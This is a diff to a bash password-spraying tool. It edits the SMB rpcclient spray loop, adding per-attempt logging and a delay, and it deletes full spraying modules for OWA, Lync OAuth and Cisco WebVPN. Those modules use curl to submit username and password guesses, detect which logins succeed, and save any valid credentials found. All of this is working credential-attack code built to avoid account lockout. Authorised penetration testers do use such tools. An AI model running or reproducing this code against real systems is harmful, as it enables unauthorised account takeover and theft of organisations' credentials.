@@ -121,23 +121,21 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
 
     #Initial spray for same username as password
     time=$(date +%H:%M:%S)
-    echo "$time Spraying with password: Users Username"
-    for u in $(cat $userslist); do 
-    	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt
-    done
     cat logs/spray-logs.txt | grep -v "Cannot"
     counter=$(($counter + 1))
     if [ $counter -eq $lockout ] ; then
     	counter=0
     	sleep $lockoutduration
     fi
-
+            
+            
     #Then start on list
     for password in $(cat $passwordlist); do
         time=$(date +%H:%M:%S)
-    	echo "$time Spraying with password: $password"
     	for u in $(cat $userslist); do 
-    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
+            (echo "$time : Spraying user: $u with password: $password")
+            (echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
+            sleep 1
     	done
         cat logs/spray-logs.txt | grep -v "Cannot"
         cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
@@ -153,193 +151,4 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     	fi
     done
     exit 0
-fi
-
-#Alpha OWA Code
-if [ "$1" == "-owa" ] || [ "$1" == "--owa" ] || [ "$1" == "owa" ] ; then
-    mkdir -p logs
-    set +H
-    target=$2
-    cp $3 logs/username-removed-successes.txt
-    userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
-    lockout=$5
-    lockoutduration=$(($6 * 60))
-    postrequest=$7
-    counter=0
-    touch logs/spray-logs.txt
-
-    #Initial spray for same username as password
-    time=$(date +%H:%M:%S)
-    echo "$time Spraying with password: Users Username"
-    for u in $(cat $userslist); do 
-        #Grep out the cookies (avoids missing javascript generated cookies)
-        cookies=$(cat $postrequest | grep "Cookie:")
-        #Grep out the post data and replace filler data with username/password combo
-        data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$u/")
-        #Grep out path to OWA post signin
-        path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
-        #Create target + path from target + path
-        targetpath="$target$path"
-        # silently follow redirctions and process additional cookies, send cookies as header, send data and output size of response, save this along with creds to log file
-        (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$u") >> logs/spray-logs.txt
-        rm -f cookies.txt
-    done 
-    # Check if there are more than one type of reponse
-    lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
-    if [ "$lines" -ge "2" ]; then
-        # Find least common response length, should be a correct credential combo
-        lowest=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | cut -d ' ' -f 5 | head -n 1)
-        cat logs/spray-logs.txt | grep "$lowest"
-    fi
-    counter=$(($counter + 1))
-    if [ $counter -eq $lockout ] ; then
-        counter=0
-        sleep $lockoutduration
-    fi
-    #Then start on list
-    for password in $(cat $passwordlist); do
-        time=$(date +%H:%M:%S)
-        echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
-            cookies=$(cat $postrequest | grep "Cookie:")
-            data=$(cat $postrequest | grep "^$" -A 1 | tail -n 1 | sed "s/sprayuser/$u/" | sed "s/spraypassword/$password/")
-            path=$(cat $postrequest | grep "POST" | cut -d ' ' -f 2)
-            targetpath="$target$path"
-            (curl -k -s -L -b cookies.txt $targetpath -H "$cookies" -d "$data" -w 'size: %{size_download}\n' -o /dev/null | cut -d ' ' -f 2 | tr '\n' ' ' && echo "$u%$password") >> logs/spray-logs.txt
-            rm -f cookies.txt
-        done   
-        lines=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | wc -l | sed 's/ //g')
-        if [ "$lines" -ge "2" ]; then
-            lowest=$(cat logs/spray-logs.txt | cut -d ' ' -f 1 | sort | uniq -c | sort | cut -d ' ' -f 5 | head -n 1)
-            cat logs/spray-logs.txt | grep "$lowest"
-            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-            cat logs/spray-logs.txt | grep "$lowest" | cut -d ' ' -f 2 | sort -u > logs/credentials.txt
-        fi
-
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
-            sed -i.bak "/$completeuser/d" $userslist
-        done
-        rm logs/usernamestoremove.txt
-        counter=$(($counter + 1))
-        if [ $counter -eq $lockout ] ; then
-            counter=0
-            sleep $lockoutduration
-        fi
-    done
-fi
-
-#Lync Password Spraying
-if [ "$1" == "-lync" ] || [ "$1" == "--lync" ] || [ "$1" == "lync" ] ; then
-    mkdir -p logs
-    set +H
-    target=$2
-    cp $3 logs/username-removed-successes.txt
-    userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
-    lockout=$5
-    lockoutduration=$(($6 * 60))
-    postrequest=$7
-    counter=0
-    touch logs/spray-logs.txt
-
-
-    #Find proper url by redirecting from lyndiscover subdomains to place that lists autodiscover links, then grab oauth link
-    autodiscover=$(curl -k -l $target 2>&1 | tr '"' '\n' | grep http | grep oauth)
-    if [ -z "$autodiscover" ] ; then
-        oauthaddress=$(curl -k -v -s $target 2>&1> /dev/null  | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
-        if [ -z "$oauthaddress" ] ; then
-            echo "URL not valid for discover redirect or autodiscover link"
-            exit
-        fi
-    else
-        #Use oauth link to get the www-authenticate address to send the login request too
-        echo "Redirect Successful..."
-        oauthaddress=$(curl -k -v -s $autodiscover 2>&1> /dev/null | grep -i "Www-Authenticate:" | grep -i "MsRtcOAuth" | tr '"' '\n' | grep -i http)
-        if [ -z "$oauthaddress" ] ; then
-            echo "Could not locate oauth request in server response"
-            exit
-        fi
-    fi
-    
-    #Then start on list
-    for password in $(cat $passwordlist); do
-        time=$(date +%H:%M:%S)
-        echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
-            access_token=$(curl -k -s --data "grant_type=password&username=$u&password=$password" $oauthaddress) 
-            #access_token=""
-            #echo "BREAKBREAKBREAKBREAK -------- xxXXXXX $u%$password"
-            #echo "$u%$password"
-            #echo "$access_token"
-            if echo $access_token | grep -q "access_token" ; then
-                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
-            else
-                echo "Incorrect $u%$password" >> logs/spray-logs.txt
-            fi
-        done   
-        cat logs/spray-logs.txt | grep "Valid Credentials"
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
-
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
-            sed -i.bak "/$completeuser/d" $userslist
-        done
-        rm logs/usernamestoremove.txt
-        counter=$(($counter + 1))
-        if [ $counter -eq $lockout ] ; then
-            counter=0
-            sleep $lockoutduration
-        fi
-    done
-fi
-
-#CISCO Web VPN Password Spraying
-if [ "$1" == "-cisco" ] || [ "$1" == "--cisco" ] || [ "$1" == "cisco" ] ; then
-    mkdir -p logs
-    set +H
-    cp $3 logs/username-removed-successes.txt
-    userslist="logs/username-removed-successes.txt"
-    passwordlist=$4
-    lockout=$5
-    lockoutduration=$(($6 * 60))
-    postrequest=$7
-    counter=0
-    touch logs/spray-logs.txt
-
-    target=$(echo $2 | cut -d '/' -f -3)
-    targetpath="$target/+webvpn+/index.html"
-    targetlogout="$target/+webvpn+/webvpn_logout.html"
-    
-    #Then start on list
-    for password in $(cat $passwordlist); do
-        time=$(date +%H:%M:%S)
-        echo "$time Spraying with password: $password"
-        for u in $(cat $userslist); do 
-            cookies="webvpn=; webvpnc=; webvpn_portal=; webvpnSharePoint=; webvpnlogin=1; webvpnLang=en;"
-            ciscologin=$(curl -k -s -L -b cookies.txt $targetpath -H "$cookies" --data "tgroup=&next=&tgcookieset=&username=$u&password=$password&Login=Login")
-            
-            if echo $ciscologin | grep -q "SSL VPN Service" | grep "webvpn_logout" ; then
-                echo "Valid Credentials $u%$password" >> logs/spray-logs.txt
-                curl -k -s -b cookies.txt $targetlogout
-            else
-                echo "Incorrect $u%$password" >> logs/spray-logs.txt
-            fi
-            rm -f cookies.txt
-        done
-
-        cat logs/spray-logs.txt | grep "Valid Credentials"
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
-        cat logs/spray-logs.txt | grep "Valid Credentials" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
-
-        for completeuser in $(cat logs/usernamestoremove.txt); do 
-            sed -i.bak "/$completeuser/d" $userslist
-        done
-        rm logs/usernamestoremove.txt
-        counter=$(($counter + 1))
-        if [ $counter -eq $lockout ] ; then
-            counter=0
-            sleep $lockoutduration
-        fi
-    done
 fi
